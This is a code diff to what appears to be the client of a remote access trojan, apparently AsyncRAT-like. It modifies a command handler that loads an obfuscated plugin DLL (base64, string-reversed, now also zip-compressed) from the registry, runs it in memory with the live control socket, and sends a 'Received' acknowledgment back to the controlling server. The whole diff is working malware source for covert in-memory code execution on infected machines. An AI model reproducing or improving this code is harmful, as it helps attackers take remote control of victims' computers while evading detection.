@@ -33,7 +33,8 @@ namespace Client.Handle_Packet
 
                     case "plugin": // run plugin in memory
                         {
-                            Assembly assembly = AppDomain.CurrentDomain.Load(Convert.FromBase64String(Strings.StrReverse(SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString))));
+                            Received();
+                            Assembly assembly = AppDomain.CurrentDomain.Load(Zip.Decompress(Convert.FromBase64String(Strings.StrReverse(SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString)))));
                             Type type = assembly.GetType("Plugin.Plugin");
                             dynamic instance = Activator.CreateInstance(type);
                             instance.Run(ClientSocket.TcpClient, Settings.ServerCertificate, Settings.Hwid, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), Methods._appMutex, Settings.MTX, Settings.BDOS, Settings.Install);
@@ -52,9 +53,9 @@ namespace Client.Handle_Packet
                             List<string> plugins = new List<string>();
                             foreach (string plugin in unpack_msgpack.ForcePathObject("Hash").AsString.Split(','))
                             {
-                                if (SetRegistry.GetValue(plugin.Trim()) == null)
+                                if (SetRegistry.GetValue(plugin) == null)
                                 {
-                                    plugins.Add(plugin.Trim());
+                                    plugins.Add(plugin);
                                     Debug.WriteLine("plguin not found");
                                 }
                             }
@@ -82,6 +83,14 @@ namespace Client.Handle_Packet
             {
                 Error(ex.Message);
             }
+        }
+
+        private static void Received()
+        {
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Packet").AsString = "Received";
+            ClientSocket.Send(msgpack.Encode2Bytes());
+            Thread.Sleep(1000);
         }
 
         public static void Error(string ex)
